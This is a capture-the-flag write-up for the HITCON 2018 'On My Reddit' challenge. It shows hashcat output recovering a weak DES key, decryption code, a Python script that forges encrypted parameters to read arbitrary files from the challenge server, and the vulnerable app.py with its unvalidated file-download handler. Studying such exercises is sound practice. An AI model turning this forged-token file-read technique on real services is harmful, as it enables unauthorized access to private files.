# HITCON CTF 2018

## Problem

- [On My Reddit](#on my reddit)



## On My Reddit

#### Description



#### Exploit



```
$ ./hashcat -m 14000 f8085ba33f9600b3:2d303739662d3464 -a 3 '?l?l?l?l?l?l?l?l'
hashcat (v4.2.1-91-g99709a3) starting...

OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce GTX 1060 6GB, 1517/6069 MB allocatable, 10MCU

... ...

f8085ba33f9600b3:2d303739662d3464:ldgonaro

Session..........: hashcat
Status...........: Cracked
Hash.Type........: DES (PT = $salt, key = $pass)
Hash.Target......: f8085ba33f9600b3:2d303739662d3464
Time.Started.....: Mon Oct 22 13:29:35 2018 (4 secs)
Time.Estimated...: Mon Oct 22 13:29:39 2018 (0 secs)
Guess.Mask.......: ?l?l?l?l?l?l?l?l [8]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  9885.6 MH/s (7.52ms) @ Accel:32 Loops:1024 Thr:256 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 32179486720/208827064576 (15.41%)
Rejected.........: 0/32179486720 (0.00%)
Restore.Point....: 1802240/11881376 (15.17%)
Restore.Sub.#1...: Salt:0 Amplifier:5120-6144 Iteration:0-1024
Candidates.#1....: uzrxagxa -> jebbylis
Hardware.Mon.#1..: Temp: 50c Fan:  0% Util: 93% Core:1999MHz Mem:3898MHz Bus:16

Started: Mon Oct 22 13:29:32 2018
Stopped: Mon Oct 22 13:29:39 2018
```



```python
from Crypto.Cipher import DES

d = DES.new('ldgonaro',DES.MODE_ECB,'')

cipher = '2e7e305f2da018a2cf8208fa1fefc238be24b0e6a4592fab1f8a22a342e43575e547d2499523d59754ba9923e44088052a5be3ba8bae2a943ca92540eb2d0a42'.decode('hex')
print d.decrypt(cipher)
'''
$ python dec.py
m=d&f=uploads%2F09609b66-e193-42aa-bc2d-07542ca4442e.pdf\x08\x08\x08\x08\x08\x08\x08\x08
'''
```



```python
from Crypto.Cipher import DES
import requests
import readline

d = DES.new('ldgonaro',DES.MODE_ECB,'')

def padding(p):
	q = len(p)/8
	r = len(p)%8
	if r != 0:
		res = p[:q*8] + p[q*8:].ljust(8,chr(8-r))
	return res

while 1:
	inp = raw_input('path : ')
	plain = 'm=d&f=%s'%(inp)
	plain = padding(plain)
	s = d.encrypt(plain).encode('hex')

	try:
		r = requests.get('http://13.115.255.46/?s=%s'%(s))
		print r.text
	except:
		print '[*] Error Occured.'
```



app.py

```python
# coding: UTF-8
import os
import web
import urllib
import urlparse
from Crypto.Cipher import DES

web.config.debug = False
ENCRPYTION_KEY = 'megnnaro'


urls = (
    '/', 'index'
)
app = web.application(urls, globals())
db = web.database(dbn='sqlite', db='db.db')


def encrypt(s):
    length = DES.block_size - (len(s) % DES.block_size)
    s = s + chr(length)*length

    cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)
    return cipher.encrypt(s).encode('hex')

def decrypt(s):
    try:
        data = s.decode('hex')
        cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)

        data = cipher.decrypt(data)
        data = data[:-ord(data[-1])]
        return dict(urlparse.parse_qsl(data))
    except Exception as e:
        print e.message
        return {}

def get_posts(limit=None):
    records = []
    for i in db.select('posts', limit=limit, order='ups desc'):
        tmp = {
            'm': 'r',
            't': i.title.encode('utf-8', 'ignore'),
            'u': i.id,
        }
        tmp['param'] = encrypt(urllib.urlencode(tmp))
        tmp['ups'] = i.ups
        if i.file:
            tmp['file'] = encrypt(urllib.urlencode({'m': 'd', 'f': i.file}))
        else:
            tmp['file'] = ''

        records.append( tmp )
    return records

def get_urls():
    urls = []
    for i in [10, 100, 1000]:
        data = {
            'm': 'p',
            'l': i
        }
        urls.append( encrypt(urllib.urlencode(data)) )
    return urls

class index:
    def GET(self):
        s = web.input().get('s')
        if not s:
            return web.template.frender('templates/index.html')(get_posts(), get_urls())
        else:
            s = decrypt(s)
            method = s.get('m', '')
            if method and method not in list('rdp'):
                return 'param error'
            if method == 'r':
                uid = s.get('u')
                record = db.select('posts', where='id=$id', vars={'id': uid}).first()
                if record:
                    raise web.seeother(record.url)
                else:
                    return 'not found'
            elif method == 'd':
                file = s.get('f')
                if not os.path.exists(file):
                    return 'not found'
                name = os.path.basename(file)
                web.header('Content-Disposition', 'attachment; filename=%s' % name)
                web.header('Content-Type', 'application/pdf')
                with open(file, 'rb') as fp:
                    data = fp.read()
                return data
            elif method == 'p':
                limit = s.get('l')
                return web.template.frender('templates/index.html')(get_posts(limit), get_urls())
            else:
                return web.template.frender('templates/index.html')(get_posts(), get_urls())


if __name__ == "__main__":
    app.run()
```



FLAG : hitcon{megnnaro}



